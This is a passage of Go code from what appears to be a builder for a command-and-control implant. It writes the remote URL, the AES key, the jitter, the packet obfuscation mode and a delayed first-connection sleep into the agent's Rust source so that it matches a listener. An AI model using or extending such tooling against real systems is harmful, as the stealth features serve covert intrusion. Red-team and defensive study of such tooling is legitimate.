	s, err = patchRustStrConst(s, "REMOTE_STUB", "REPLACE_ME_URL", connStr)
	if err != nil {
		return err
	}

	// 2. AES key (required for Noise PSK alignment)
	if aesKey == "" {
		return fmt.Errorf("builder: empty AES key")
	}
	if !isValidAESKeyString(aesKey) {
		return fmt.Errorf("AES key must be 32 bytes ASCII or 64 hex characters")
	}
	s, err = patchRustStrConst(s, "AES_KEY", "REPLACE_ME_AES_KEY", strings.TrimSpace(aesKey))
	if err != nil {
		return err
	}

	// 3. Salt (optional empty → leave REPLACE_ME_SALT; runtime uses zero salt)
	if salt != "" {
		s, err = patchRustStrConst(s, "ENCRYPTION_SALT", "REPLACE_ME_SALT", salt)
		if err != nil {
			return err
		}
	}

	// 4. Jitter
	jitterStr := fmt.Sprintf("%d", jitter)
	if jitter <= 0 {
		jitterStr = "30"
	}
	s, err = patchRustStrConst(s, "JITTER", "REPLACE_ME_JITTER", jitterStr)
	if err != nil {
		return err
	}

	// 5. Packet obfuscation — must match listener ObfuscateMode exactly.
	// Empty only → product default "padding". Do NOT rewrite explicit "none"
	// (that caused Noise OK + GCM auth fail when listener stayed on none).
	obfVal := strings.ToLower(strings.TrimSpace(obfMode))
	if obfVal == "" {
		obfVal = "padding"
	}
	s, err = patchRustStrConst(s, "OBFUSCATION_MODE", "REPLACE_ME_OBF", obfVal)
	if err != nil {
		return err
	}

	// 6. Startup sleep (panel sleep_time) — agent waits this many seconds before first connect.
	// Aligns with binary PatchPayload ST_DATA_INT_NNNN slot.
	if sleepSecs < 0 {
		sleepSecs = 0
	}
	if sleepSecs > 9999 {
		sleepSecs = 9999
	}
	s, err = patchRustStrConst(s, "SLEEP_SECS", "REPLACE_ME_SLEEP", fmt.Sprintf("%d", sleepSecs))
	if err != nil {
		return err
	}
	// Keep binary template in sync for tools that only look at SLEEP_TIME_TEMPLATE.
	oldSleepTpl := `*b"ST_DATA_INT_0000"`
	neuSleepTpl := fmt.Sprintf(`*b"ST_DATA_INT_%04d"`, sleepSecs)
	if strings.Contains(s, oldSleepTpl) {
		s = strings.Replace(s, oldSleepTpl, neuSleepTpl, 1)
	}

	_ = heartbeat   // reserved: HB template patch can be added similarly
	_ = dnsResolver // reserved: DNS resolver source patch

	return os.WriteFile(path, []byte(s), 0644)
}

func isValidAESKeyString(key string) bool {
	key = strings.TrimSpace(key)
	if len(key) == 32 {
		return true
	}
	if len(key) == 64 && isHexString(key) {
		return true
	}
	return false
}

func moveFile(src, dst string) error {
	if err := os.Rename(src, dst); err == nil { return nil }
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	if _, err := io.Copy(df, sf); err != nil { return err }
	return os.Remove(src)
}

